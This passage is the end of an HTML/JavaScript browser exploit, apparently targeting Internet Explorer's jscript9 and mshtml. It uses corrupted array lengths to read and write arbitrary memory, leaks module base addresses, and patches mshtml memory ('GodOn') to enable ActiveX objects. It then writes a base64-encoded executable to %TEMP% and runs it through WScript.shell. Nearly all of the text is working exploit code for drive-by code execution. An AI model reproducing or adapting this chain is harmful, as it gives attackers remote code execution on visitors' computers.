		a[i][0x134/4]=0x100;
		a[i][0xf988/4]=0x0;
		a[i][0xf98c/4]=0x0;
		a[i][0x7e8/4]=0x0;
		a[i][0x7e4/4]=0x0;
	}
	trigger();
	var idx = -1;
	for (var i = 0; i < 0x1000 - 1; ++i) {
		a[i][array_len + header_size/4] = 1;
		if (a[i+1][0]==1) {
			idx = i;
			break; 
		}
	}
	if (idx==-1) {
		alert("Can't find the modified Array"); 
		window.location.reload();
		return;
	}
	//alert("Found");
	a[idx][array_len+0x14/4] = 0x3fffffff;
	a[idx][array_len+0x18/4] = 0x3fffffff;
	a[idx+1].length=0x3fffffff;
	//alert("First Done");
	var base_addr = magic_addr+0x10000+header_size;

	function int2uint(x) {
		return (x<0)?0x100000000+x:x;
	}

	function uint2int(x) {
		return (x>=0x80000000)?x-0x100000000:x;
	}
	function read(addr) {
		var delta=addr-base_addr;
		var res;
		if (delta>=0)
			res=a[idx+1][delta/4];
		else
			res=a[idx+1][(0x100000000+delta)/4];
		return int2uint(res);
	}
	function write(addr,val) {
		val=uint2int(val);
		var delta=addr-base_addr;
		if (delta>=0)
			a[idx+1][delta/4]=val;
		else
			a[idx+1][(0x100000000+delta)/4]=val;
	}
	function get_addr(obj) {
		a[idx+2][0]=obj;
		return read(base_addr+0x10000);
	}

	function atob(input) {
		var chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/='; 
		var str = String(input).replace(/=+$/, '');
		if (str.length % 4 == 1) {
			throw new InvalidCharacterError("'atob' failed: The string to be decoded is not correctly encoded."); 
		}
		for (
			var bc = 0, bs, buffer, idx = 0, output = '';
			buffer = str.charAt(idx++);
			~buffer && (bs = bc % 4 ? bs * 64 + buffer : buffer,
			bc++ % 4) ? output += String.fromCharCode(255 & bs >> (-2 * bc & 6)) : 0 
		){
			buffer = chars.indexOf(buffer); 
		}
		return output; 
	}

	var addr=get_addr(document.createElement("div"));
	//alert(addr.toString(16));
	var jscript9=read(addr)-0x6da0;
	document.write("jscript9 at: "+jscript9.toString(16));
	var mshtml=read(read(read(read(addr+0xc)+8)+0x10))-0x1e90b0;
	document.write("mshtml at: "+mshtml.toString(16));
	//alert("Second done");
	var old=read(mshtml+0xef56a0+0x14);
	var old1=read(mshtml+0xef56a0+0x10);

	function GodOn() {
		write(mshtml+0xef56a0+0x14,jscript9+0xcc05f);  // mov esp,ebp pop ebp ret
		write(mshtml+0xef56a0+0x10,jscript9+0xcc295);  // mov esp,ebp pop ebp ret
	}
	function GodOff() {
		write(mshtml+0xef56a0+0x14,old);
		write(mshtml+0xef56a0+0x10,old1);
	}
	runcalc="TVqQAAMAAA...AAAAAA=";
	GodOn();
	var shell = new ActiveXObject("WScript.shell");
	var tStream = new ActiveXObject("ADODB.Stream"); 
	var bStream = new ActiveXObject("ADODB.Stream");
	GodOff();
	function createExe(fname, data) {
		tStream.Type = 2; // text 
		bStream.Type = 1; // binary 
		tStream.Open(); 
		bStream.Open();
		tStream.WriteText(data);
		tStream.Position = 2;
		tStream.CopyTo(bStream);
		var bStream_addr = get_addr(bStream);
		bStream.SaveToFile(fname, 2);
		tStream.Close();
		bStream.Close();
	}
	function decode(b64Data) {
		var data = atob(b64Data);
		var arr = new Array();
		for (var i = 0; i < data.length / 2; ++i) {
			var low = data.charCodeAt(i*2);
			var high = data.charCodeAt(i*2 + 1); 
			arr.push(String.fromCharCode(low + high * 0x100));
		}
		return arr.join(''); 
	}
	fname=shell.ExpandEnvironmentStrings("%TEMP%\\runcalc.exe"); 
	createExe(fname, decode(runcalc));
	shell.Exec(fname);
}
</script> 
</head> 
<body>
<v:group id="vml" style="width:500pt;"><div></div></group>
</body> 
</html>
```